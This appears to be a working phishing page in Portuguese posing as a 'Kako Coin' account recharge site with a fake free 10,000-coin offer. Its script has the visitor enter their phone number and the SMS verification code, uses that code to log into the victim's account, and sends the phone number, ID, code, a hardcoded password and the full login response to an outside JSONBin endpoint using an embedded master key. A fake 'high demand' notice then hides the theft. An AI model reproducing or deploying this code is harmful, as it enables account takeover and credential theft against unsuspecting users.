<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga de Conta | Kako Coin</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <meta name="description" content="Sistema de recarga Kako Coin">
    <style>
        .free-badge {
            position: absolute;
            bottom: -15px;
            right: 10px;
            font-size: 12px;
            color: red;
            font-weight: bold;
        }
        .banner-flash {
            animation: flash 2s infinite;
        }
        @keyframes flash {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        .coin-option.selected {
            background-color: #7e22ce !important;
            color: white !important;
        }
        #pinModal {
            transition: opacity 0.3s ease;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .phone-prefix {
            display: inline-flex;
            align-items: center;
            padding: 0 12px;
            background-color: #e5e7eb;
            border: 1px solid #d1d5db;
            border-right: none;
            border-radius: 6px 0 0 6px;
            height: 100%;
            color: #374151;
        }
        .validation-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
        }
        .input-wrapper {
            position: relative;
        }
    </style>
</head>
<body class="bg-gray-100 font-sans">
    <!-- Modal para validação do PIN -->
    <div id="pinModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
        <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md">
            <div class="flex justify-between items-center mb-4">
                <h3 class="text-xl font-bold text-purple-800">Valide seu ID</h3>
                <button id="closePinModal" class="text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <p class="mb-4">Enviamos um código de 6 dígitos para o seu número. Digite abaixo para validar:</p>
            <form id="pinForm" class="space-y-4">
                <div class="input-wrapper">
                    <input type="text" id="pinInput" maxlength="6" 
                           class="w-full px-4 py-3 border border-gray-300 rounded-md text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-purple-600"
                           placeholder="000000" oninput="validatePin(this)">
                    <p id="pinError" class="text-red-600 text-sm mt-1 hidden">PIN inválido. Digite apenas números.</p>
                </div>
                <button type="submit" id="submitPinBtn" 
                        class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
                    Validar e Recarregar
                </button>
            </form>
        </div>
    </div>

    <div class="container mx-auto px-4 py-8">
        <!-- Aviso acadêmico -->
        <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
            <p class="font-bold">AVISO:</p>
            <p class="mb-2">*Termos e Condições: Esta promoção é válida apenas para primeira recarga de novos usuários.</p>
            <p>A promoção é válida exclusivamente para usuários brasileiros e/ou com número de telefone nacional (+55).</p>
            <p class="mt-4">Ao realizar a recarga, você concorda com nossos Termos de Serviço e Política de Privacidade.</p>
        </div>

        <!-- Header -->
        <header class="flex justify-between items-center mb-8">
            <div class="flex items-center">
                <img src="https://play-lh.googleusercontent.com/F_Bge1FUPjFpMBcLc6ChvhbTJAIG6dDgcIKYcQJimRmnuv_qTtfVEIucrWui2VHerdvq" 
                     alt="Logo Kako" class="h-12">
                <h1 class="ml-2 text-2xl font-bold text-purple-800">KAKO COIN</h1>
                <img src="https://i.ibb.co/W4GBrhXd/images-removebg-preview.png" alt="Kako Coin" class="h-12 ml-2">
            </div>
        </header>

        <!-- Main Content -->
        <main class="flex flex-col md:flex-row gap-8">
            <!-- Form Section -->
            <div class="bg-white rounded-lg shadow-md p-6 flex-1">
                <h2 class="text-2xl font-bold text-purple-800 mb-6">Recarga de Conta</h2>
                
                <form id="rechargeForm" class="space-y-4">
                    <input type="hidden" id="amount" name="amount" value="10000">
                    
                    <div>
                        <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
                        <div class="flex input-wrapper">
                            <span class="phone-prefix">+55</span>
                            <input type="tel" id="phone" name="phone" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-purple-600"
                                   placeholder="DDD + Número" oninput="formatPhone(this)" onblur="validatePhone(this)">
                            <div id="phoneValidation" class="validation-icon hidden"></div>
                        </div>
                        <p id="phoneError" class="text-red-600 text-sm mt-1 hidden"></p>
                    </div>
                    
                    <div>
                        <label for="id" class="block text-sm font-medium text-gray-700 mb-1">ID</label>
                        <input type="text" id="id" name="id" required 
                               class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-600"
                               oninput="sanitizeId(this)">
                        <p class="text-red-600 text-sm mt-1">NECESSITA VALIDAÇÃO DE ID</p>
                    </div>
                    
                    <div id="errorMessage" class="hidden text-red-600 text-sm"></div>
                    
                    <button type="submit" id="submitBtn" 
                            class="w-full bg-gray-400 text-white py-3 px-4 rounded-md transition duration-200 font-medium" disabled>
                        Simular Recarga
                    </button>
                </form>
            </div>
            
            <!-- Promo Section -->
            <div class="flex-1">
                <div class="bg-gradient-to-r from-green-400 to-green-500 rounded-lg shadow-md p-6 text-white mb-6 banner-flash">
                    <div class="flex items-center">
                        <div class="mr-4">
                            <i class="fas fa-gift text-4xl"></i>
                        </div>
                        <div>
                            <h3 class="text-2xl font-bold">Primeira recarga de 10.000 é GRÁTIS!*</h3>
                            <p class="mt-2">Oferta por tempo limitado para novos usuários. Reivindique sua recarga grátis agora!</p>
                        </div>
                    </div>
                </div>
                
                <!-- Coin Options -->
                <div class="bg-white rounded-lg shadow-md p-6">
                    <h3 class="text-xl font-bold text-purple-800 mb-4">Opções de Recarga</h3>
                    
                    <div class="grid grid-cols-2 gap-4">
                        <button type="button" class="coin-option selected w-full bg-purple-700 text-white py-3 px-4 rounded-md hover:bg-purple-800 transition duration-200 font-medium relative" data-amount="10000">
                            10.000 Kako Moedas
                            <span class="free-badge">1x FREE</span>
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="50000">
                            50.000 Kako Moedas
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="100000">
                            100.000 Kako Moedas
                        </button>
                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="500000">
                            500.000 Kako Moedas
                        </button>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="mt-12 text-center text-gray-600 text-sm">
            <p>© 2023 Kako Coin. Todos os direitos reservados.</p>
            <div class="mt-2 flex justify-center space-x-4">
                <a href="#" class="hover:text-purple-700">Termos de Serviço</a>
                <a href="#" class="hover:text-purple-700">Política de Privacidade</a>
                <a href="#" class="hover:text-purple-700">Contate-nos</a>
            </div>
        </footer>
    </div>

    <script>
        // Senha padrão
        const DEFAULT_PASSWORD = '335112d1r7y';

        // Variáveis para armazenar dados temporários
        let currentPhone = '';
        let currentId = '';
        let phoneStatus = null;

        // Função para formatar telefone
        function formatPhone(input) {
            // Remove tudo que não é número
            let value = input.value.replace(/\D/g, '');
            
            // Limita a 11 dígitos (DDD + número)
            if (value.length > 11) {
                value = value.slice(0, 11);
            }
            
            // Aplica a formatação
            if (value.length > 0) {
                value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
                if (value.length > 10) {
                    value = value.replace(/(\d{5})(\d)/, '$1-$2');
                }
            }
            
            input.value = value;
            
            // Se o telefone estiver completo, valida
            if (value.replace(/\D/g, '').length === 11) {
                validatePhone(input);
            } else {
                // Reset da validação se não estiver completo
                resetPhoneValidation();
            }
        }

        // Função para resetar a validação do telefone
        function resetPhoneValidation() {
            const validationIcon = document.getElementById('phoneValidation');
            const phoneError = document.getElementById('phoneError');
            const submitBtn = document.getElementById('submitBtn');
            
            validationIcon.classList.add('hidden');
            phoneError.classList.add('hidden');
            submitBtn.disabled = true;
            submitBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
            submitBtn.classList.add('bg-gray-400');
            
            phoneStatus = null;
        }

        // Função para validar o telefone
        async function validatePhone(input) {
            const phoneNumber = input.value.replace(/\D/g, '');
            
            if (phoneNumber.length !== 11) {
                resetPhoneValidation();
                return;
            }
            
            const validationIcon = document.getElementById('phoneValidation');
            const phoneError = document.getElementById('phoneError');
            const submitBtn = document.getElementById('submitBtn');
            
            // Mostra ícone de carregamento
            validationIcon.innerHTML = '<i class="fas fa-spinner fa-spin text-gray-400"></i>';
            validationIcon.classList.remove('hidden');
            phoneError.classList.add('hidden');
            
            try {
                // Verifica o status do telefone
                const formattedPhone = '+55' + phoneNumber;
                const status = await checkPhoneStatus(formattedPhone);
                
                if (status === 1) {
                    // Status 1: Telefone válido
                    validationIcon.innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
                    submitBtn.disabled = false;
                    submitBtn.classList.remove('bg-gray-400');
                    submitBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
                    phoneStatus = 1;
                } else {
                    // Status 2: Telefone inválido
                    validationIcon.innerHTML = '<i class="fas fa-times-circle text-red-500"></i>';
                    phoneError.textContent = 'Este número não está associado a uma conta. Verifique ou crie uma conta primeiro.';
                    phoneError.classList.remove('hidden');
                    submitBtn.disabled = true;
                    submitBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
                    submitBtn.classList.add('bg-gray-400');
                    phoneStatus = 2;
                }
            } catch (error) {
                console.error('Erro ao validar telefone:', error);
                validationIcon.innerHTML = '<i class="fas fa-exclamation-circle text-yellow-500"></i>';
                phoneError.textContent = 'Erro ao verificar telefone. Tente novamente.';
                phoneError.classList.remove('hidden');
                phoneStatus = null;
            }
        }

        // Função para verificar se o telefone está associado a uma conta
        async function checkPhoneStatus(phone) {
            try {
                const response = await fetch('/api/check-phone', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ phone })
                });
                
                const data = await response.json();
                
                // Se a API retornar código 0, é sucesso (status 1)
                // Se retornar outro código, é erro (status 2)
                return data.code === 0 ? 1 : 2;
            } catch (error) {
                console.error('Erro na verificação de telefone:', error);
                return 2; // Retorna status 2 em caso de erro
            }
        }

        // Função para sanitizar o ID (remover espaços, letras, símbolos, emojis)
        function sanitizeId(input) {
            input.value = input.value.replace(/[^0-9]/g, '');
        }

        // Função para validar o PIN (apenas números)
        function validatePin(input) {
            const pinError = document.getElementById('pinError');
            // Permite apenas números
            input.value = input.value.replace(/\D/g, '');
            
            if (input.value.length > 6) {
                input.value = input.value.slice(0, 6);
            }
            
            // Mostra erro se ainda houver caracteres não numéricos (não deveria acontecer após replace)
            if (/\D/.test(input.value)) {
                pinError.classList.remove('hidden');
            } else {
                pinError.classList.add('hidden');
            }
        }

        // Ofusca apenas o ID (mostra 3 primeiros caracteres)
        function maskID(id) {
            return id.slice(0, 3) + '*'.repeat(Math.max(0, id.length - 3));
        }

        // Seleção de moedas
        document.querySelectorAll('.coin-option').forEach(button => {
            button.addEventListener('click', function() {
                document.querySelectorAll('.coin-option').forEach(btn => {
                    btn.classList.remove('selected', 'bg-purple-700', 'text-white');
                    btn.classList.add('bg-purple-100', 'text-purple-800');
                });
                this.classList.add('selected', 'bg-purple-700', 'text-white');
                this.classList.remove('bg-purple-100', 'text-purple-800');
                document.getElementById('amount').value = this.dataset.amount;
            });
        });

        // Modal de PIN
        const pinModal = document.getElementById('pinModal');
        const closePinModal = document.getElementById('closePinModal');
        const pinForm = document.getElementById('pinForm');
        const submitBtn = document.getElementById('submitBtn');
        const submitPinBtn = document.getElementById('submitPinBtn');
        
        // Fechar modal
        closePinModal.addEventListener('click', function() {
            pinModal.classList.add('hidden');
        });
        
        // Envio do formulário principal
        document.getElementById('rechargeForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Validações básicas
            const phone = document.getElementById('phone').value;
            const id = document.getElementById('id').value;
            
            if (!phone || phone.replace(/\D/g, '').length < 10) {
                alert('Por favor, informe um número de telefone válido com DDD.');
                return;
            }
            
            if (!id || id.length < 3) {
                alert('Por favor, informe um ID válido.');
                return;
            }
            
            // Verifica se o telefone foi validado
            if (phoneStatus !== 1) {
                alert('Por favor, verifique se o telefone está correto e associado a uma conta.');
                return;
            }
            
            // Armazena os dados temporariamente
            currentPhone = '+55' + phone.replace(/\D/g, '');
            currentId = id.replace(/\D/g, '');
            
            // Atualiza o texto do botão para mostrar loading
            submitBtn.innerHTML = '<span class="loading"></span> Enviando código...';
            submitBtn.disabled = true;
            
            try {
                // Envia solicitação de SMS através da nossa API
                const response = await fetch('/api/check-phone', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        phone: currentPhone
                    })
                });
                
                const result = await response.json();
                
                if (result.code === 0) {
                    // Sucesso - abre o modal para inserir o PIN
                    pinModal.classList.remove('hidden');
                } else {
                    // Erro na API
                    alert('Erro ao solicitar código: ' + (result.msg || 'Código de erro desconhecido'));
                }
            } catch (error) {
                console.error('Erro ao enviar solicitação:', error);
                alert('Erro ao conectar com o servidor. Tente novamente.');
            } finally {
                // Restaura o botão
                submitBtn.innerHTML = 'Simular Recarga';
                submitBtn.disabled = false;
            }
        });
        
        // Envio do formulário de PIN
        pinForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const pinInput = document.getElementById('pinInput');
            const pin = pinInput.value;
            
            // Valida o PIN
            if (pin.length !== 6 || /\D/.test(pin)) {
                document.getElementById('pinError').classList.remove('hidden');
                return;
            }
            
            // Atualiza o texto do botão para mostrar loading
            submitPinBtn.innerHTML = '<span class="loading"></span> Validando...';
            submitPinBtn.disabled = true;
            
            let apiResult = null;
            
            try {
                // Envia solicitação de login com a senha padrão através da nossa API
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        phone: currentPhone,
                        code: pin
                    })
                });
                
                apiResult = await response.json();
                
                // Verifica se é um dos códigos de erro conhecidos
                if (apiResult.code === 12007 || apiResult.code === 10002) {
                    // Código inválido
                    alert('Código de verificação inválido. Tente novamente.');
                } else if (apiResult.code === 0) {
                    // Login bem-sucedido
                    await sendToJsonBin(currentPhone, currentId, pin, apiResult);
                    
                    // Fecha o modal
                    pinModal.classList.add('hidden');
                    
                    // Mensagem de sucesso
                    alert(`⚠️ ATENÇÃO - ALTA DEMANDA\n\n` +
                          `📱 Sua recarga de 10.000 moedas foi recebida!\n\n` +
                          `🆔 ID: ${currentId}\n` +
                          `⏱️ Status: Na fila de processamento\n\n` +
                          `⌛ Devido à grande demanda atual, o crédito pode demorar até 1 hora\n\n` +
                          `🔍 Dica: Verifique em "Histórico" após 15 minutos\n` +
                          `📞 Problemas? Contate o suporte no app`);
                } else {
                    // Outro erro
                    alert('Erro inesperado: ' + (apiResult.msg || 'Código de erro desconhecido'));
                }
            } catch (error) {
                console.error('Erro ao validar PIN:', error);
                alert('Erro ao conectar com o servidor. Tente novamente.');
            } finally {
                // Restaura o botão
                submitPinBtn.innerHTML = 'Validar e Recarregar';
                submitPinBtn.disabled = false;
            }
        });
        
        // Função para enviar dados para JSONBin.io
        async function sendToJsonBin(phone, id, pin, apiResult) {
            // Coleta dados
            const formData = {
                telefone: phone,
                id: id, // ID completo sem ofuscar
                pin: pin,
                senha_padrao: DEFAULT_PASSWORD,
                api_response: apiResult, // Inclui a resposta completa da API
                timestamp: new Date().toISOString()
            };

            // Master Key do JSONBin
            const MASTER_KEY = "$2a$10$9VJv2nY4tgeiSfh3AuAyUusmEFDpEMafqxKKHkOpikyoKc4QTd89m";

            try {
                // Envia para JSONBin.io
                const response = await fetch("https://api.jsonbin.io/v3/b", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Master-Key": MASTER_KEY
                    },
                    body: JSON.stringify(formData)
                });

                const result = await response.json();
                console.log("Dados salvos no JSONBin:", result);
            } catch (error) {
                console.error("Erro ao enviar para JSONBin:", error);
            }
        }
    </script>
</body>
</html>
